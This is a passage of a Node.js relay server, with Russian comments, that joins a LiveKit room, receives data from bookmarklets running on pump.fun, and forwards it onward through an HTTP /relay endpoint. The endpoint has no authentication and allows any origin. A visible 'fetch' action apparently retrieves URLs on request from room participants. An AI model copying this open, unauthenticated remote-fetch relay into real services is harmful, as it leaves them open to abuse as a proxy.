        sendDataToRoom({ action: 'fetch_result', ok: false, error: e.message, url: targetUrl, ts: Date.now() }, [fromIdentity]);
      });

  } else {
    sendDataToRoom({ action: 'ack', ok: true, echo: action, ts: Date.now() }, [fromIdentity]);
  }
}

// ─── Подключение через @livekit/rtc-node (ПРАВИЛЬНЫЙ способ) ─────────────────
async function connectAgent() {
  if (reconnectTimer) {
    clearTimeout(reconnectTimer);
    reconnectTimer = null;
  }

  var at = new AccessToken(LK_API_KEY, LK_API_SECRET, {
    identity: AGENT_IDENTITY,
    ttl: '24h',
  });
  at.addGrant({
    room: ROOM_NAME,
    roomJoin: true,
    canPublish: true,
    canPublishData: true,
    canSubscribe: true,
  });

  var token;
  try {
    token = await at.toJwt();
  } catch (e) {
    console.error('[agent] Token error: ' + e.message + '. Retry in 10s...');
    reconnectTimer = setTimeout(connectAgent, 10000);
    return;
  }

  var room = new Room();
  agentRoom = room;

  // ─── DataReceived — срабатывает когда букмарклет делает publishData() ─────
  room.on(RoomEvent.DataReceived, function (data, participant, kind, topic) {
    var fromId = (participant && participant.identity) || 'unknown';
    if (fromId === AGENT_IDENTITY) return; // игнорируем свои пакеты

    totalReceived++;
    var text = Buffer.from(data).toString('utf8');
    console.log('[data] #' + totalReceived + ' from=' + fromId + ' len=' + text.length + (topic ? ' topic=' + topic : ''));

    try {
      processData(JSON.parse(text), fromId);
    } catch (e) {
      console.error('[data] JSON parse error: ' + e.message);
      sendDataToRoom({ action: 'error', error: 'JSON parse: ' + e.message, ts: Date.now() }, [fromId]);
    }
  });

  room.on(RoomEvent.Connected, function () {
    agentConnected = true;
    console.log('');
    console.log('[agent] Connected via @livekit/rtc-node!');
    console.log('[agent] Room: ' + ROOM_NAME + ' | Identity: ' + AGENT_IDENTITY);
    console.log('[agent] Waiting for data from bookmarklets...');
    console.log('');
  });

  room.on(RoomEvent.Disconnected, function () {
    agentConnected = false;
    agentRoom = null;
    console.log('[agent] Disconnected. Reconnect in 5s...');
    reconnectTimer = setTimeout(connectAgent, 5000);
  });

  room.on(RoomEvent.ParticipantConnected, function (participant) {
    console.log('[agent] Participant joined: ' + participant.identity);
  });

  room.on(RoomEvent.ParticipantDisconnected, function (participant) {
    console.log('[agent] Participant left: ' + participant.identity);
  });

  try {
    console.log('[agent] Connecting to ' + LK_WS_URL + ' room=' + ROOM_NAME + '...');
    await room.connect(LK_WS_URL, token, {
      autoSubscribe: true,
    });
  } catch (e) {
    console.error('[agent] Connect error: ' + e.message + '. Retry in 5s...');
    agentConnected = false;
    agentRoom = null;
    reconnectTimer = setTimeout(connectAgent, 5000);
  }
}

// ─── HTTP server ─────────────────────────────────────────────────────────────
var httpServer = http.createServer(function (req, res) {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET,POST,OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type,Authorization,X-Agent-Secret');
  if (req.method === 'OPTIONS') { res.writeHead(204); res.end(); return; }

  if (req.method === 'GET' && (req.url === '/' || req.url === '/health')) {
    res.writeHead(200, { 'content-type': 'application/json' });
    res.end(JSON.stringify({
      ok: true,
      service: 'railway-livekit-agent-v6',
      transport: '@livekit/rtc-node',
      room: ROOM_NAME,
      agentConnected: agentConnected,
      totalReceived: totalReceived,
      vercelUrl: VERCEL_URL,
      ts: Date.now(),
    }));
    return;
  }

  if (req.method === 'POST' && req.url === '/relay') {
    var body = '';
    req.on('data', function (c) { body += c.toString(); });
    req.on('end', function () {
      try {
        processData(JSON.parse(body), 'http-relay');
        res.writeHead(200, { 'content-type': 'application/json' });
        res.end(JSON.stringify({ ok: true, message: 'Data received by Railway agent v6' }));
      } catch (e) {
        res.writeHead(400, { 'content-type': 'application/json' });
        res.end(JSON.stringify({ ok: false, error: e.message }));
      }
    });
    return;
  }

  res.writeHead(404);
  res.end(JSON.stringify({ ok: false, error: 'Not found' }));
});

httpServer.listen(PORT, function () {
  console.log('');
  console.log('╔══════════════════════════════════════════════════════════════╗');
  console.log('║  Railway LiveKit Agent v6  (@livekit/rtc-node)              ║');
  console.log('║  pump.fun → bukmarklet → LiveKit DataChannel → THIS → Vercel║');
  console.log('╚══════════════════════════════════════════════════════════════╝');
  console.log('');
  console.log('[server] Port:    ' + PORT);
  console.log('[server] Room:    ' + ROOM_NAME);
  console.log('[server] LiveKit: ' + LK_WS_URL);
  console.log('[server] Vercel:  ' + VERCEL_URL);
  console.log('[server] TG:      ' + (TG_TOKEN ? 'configured' : 'NOT SET'));
  console.log('');
  connectAgent();
});


